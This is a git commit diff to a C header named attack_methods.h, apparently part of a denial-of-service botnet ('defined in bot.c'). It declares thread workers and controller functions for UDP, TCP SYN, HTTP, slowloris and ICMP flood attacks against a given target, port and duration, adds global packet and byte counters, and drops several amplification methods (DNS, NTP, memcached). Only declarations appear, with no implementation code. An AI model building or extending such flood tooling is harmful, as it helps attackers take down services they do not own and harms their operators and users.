f56731cb2fbb4a928b69285ee872264fa9ccb536
G406G <pedrosorianoortiz29@gmail.com>
2025-09-27 21:49:08 -0400

    Update attack_methods.h

--- attack_methods.h
+++ attack_methods.h
@@ -10,34 +10,30 @@ typedef struct {
     int duration;
 } attack_params_t;
 
+// Declare as extern (defined in bot.c)
 extern volatile int attack_active;
+extern volatile long long total_packets_sent;
+extern volatile long long total_bytes_sent;
+extern volatile int active_threads;
 
 // UDP Methods
 void* udp_flood_worker(void* arg);
-void* udp_raw_worker(void* arg);
 
 // TCP Methods  
 void* tcp_syn_worker(void* arg);
-void* tcp_ack_worker(void* arg);
 
 // HTTP Methods
 void* http_flood_worker(void* arg);
 void* slowloris_worker(void* arg);
 
-// Amplification Methods
-void* dns_amp_worker(void* arg);
-void* ntp_amp_worker(void* arg);
-
 // Special Methods
 void* icmp_flood_worker(void* arg);
-void* memcached_amp_worker(void* arg);
 
 // Attack controllers
 void start_udp_flood(const char* target, int port, int duration, int threads);
 void start_tcp_syn(const char* target, int port, int duration, int threads);
 void start_http_flood(const char* target, int port, int duration, int threads);
 void start_slowloris(const char* target, int port, int duration, int threads);
-void start_dns_amp(const char* target, int duration, int threads);
 void start_icmp_flood(const char* target, int duration, int threads);
 
 #endif
